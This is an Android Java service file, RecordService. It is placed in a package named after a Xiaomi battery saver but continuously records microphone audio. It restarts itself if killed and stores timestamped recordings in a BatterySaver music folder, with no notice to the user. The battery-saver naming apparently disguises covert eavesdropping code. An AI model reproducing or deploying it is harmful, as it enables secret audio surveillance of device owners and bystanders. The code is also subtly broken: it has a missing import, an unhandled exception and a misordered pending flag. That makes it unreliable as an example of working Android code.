package com.xiaomi.batterysaver.service;

import android.app.Service;
import android.content.ContentValues;
import android.content.Intent;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.IBinder;
import android.provider.MediaStore;
import androidx.annotation.Nullable;
import androidx.core.content.ContextCompat;

import java.io.IOException;

public class RecordService extends Service {
    private MediaRecorder mediaRecorder;
    private Uri audioFileUri;

    @Override
    public void onCreate() {
        super.onCreate();
        if (hasPermissions()) {
            setupMediaRecorder();
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (hasPermissions()) {
            startRecording();
        }
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        stopRecording();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void setupMediaRecorder() {
        mediaRecorder = new MediaRecorder();
        mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
        mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
    }

    private void startRecording() {
        audioFileUri = createAudioFileUri();
        if (audioFileUri != null) {
            mediaRecorder.setOutputFile(getContentResolver().openFileDescriptor(audioFileUri, "w").getFileDescriptor());
            try {
                mediaRecorder.prepare();
                mediaRecorder.start();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    private void stopRecording() {
        if (mediaRecorder != null) {
            mediaRecorder.stop();
            mediaRecorder.release();
            mediaRecorder = null;
        }
    }

    private Uri createAudioFileUri() {
        ContentValues values = new ContentValues();
        values.put(MediaStore.Audio.Media.DISPLAY_NAME, "audio_record_" + System.currentTimeMillis() + ".mp4");
        values.put(MediaStore.Audio.Media.RELATIVE_PATH, "Music/BatterySaver/");
        values.put(MediaStore.Audio.Media.IS_PENDING, 1);

        Uri uri = getContentResolver().insert(MediaStore.Audio.Media.EXTERNAL_CONTENT_URI, values);
        if (uri != null) {
            ContentValues updateValues = new ContentValues();
            updateValues.put(MediaStore.Audio.Media.IS_PENDING, 0);
            getContentResolver().update(uri, updateValues, null, null);
        }
        return uri;
    }

    private boolean hasPermissions() {
        return ContextCompat.checkSelfPermission(this, android.Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED;
    }
}